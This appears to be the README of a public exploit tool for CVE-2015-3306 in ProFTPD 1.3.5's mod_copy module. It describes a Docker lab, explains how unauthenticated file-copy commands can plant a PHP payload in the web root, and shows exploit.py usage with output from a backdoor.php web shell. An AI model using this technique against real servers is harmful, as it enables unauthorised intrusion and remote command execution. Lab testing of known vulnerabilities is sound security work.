# ProFTPd 1.3.5 - (mod_copy) Remote Command Execution

ProFTPD is a highly configurable FTP daemon for Unix and Unix-like operating systems. ProFTPD grew from a desire for a secure and configurable FTP server. It was inspired by a significant admiration of the Apache web server. Unlike most other Unix FTP servers, it has not been derived from the old BSD `ftpd` code base, but is a completely new design and implementation.

## Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker build -t vuln/cve-2015-3306 .
    docker run --rm -it -p 21:21 -p 80:80 vuln/cve-2015-3306

And it will spawn a vulnerable application on your host on `21` and `80` port

## Vulnerable code

The `mod_copy` module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.
Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using `/proc/self/cmdline` to copy a PHP payload to the website directory, PHP remote code execution is made possible.

## Exploit

To exploit this target just run:

    ./exploit.py --host HOST --port PORT --path PATH

If you are using this vulnerable image, you can just run:

    ./exploit.py --host 127.0.0.1 --port 21 --path "/var/www/html/"

After the exploitation, a file called backdoor.php will be stored on the root folder of the web directory. And the exploit will drop you a shell where you can send commands to the backdoor:

	./exploit.py --host 127.0.0.1 --port 21 --path "/var/www/html/"
	[+] CVE-2015-3306 exploit by t0kx
	[+] Exploiting 127.0.0.1:21
	[+] Target exploited, acessing shell at http://127.0.0.1/backdoor.php
	[+] Running whoami: www-data
	[+] Done

## Credits

This vulnerability was found by Vadim Melihow.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (t0kx) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not t0kx's responsibility.
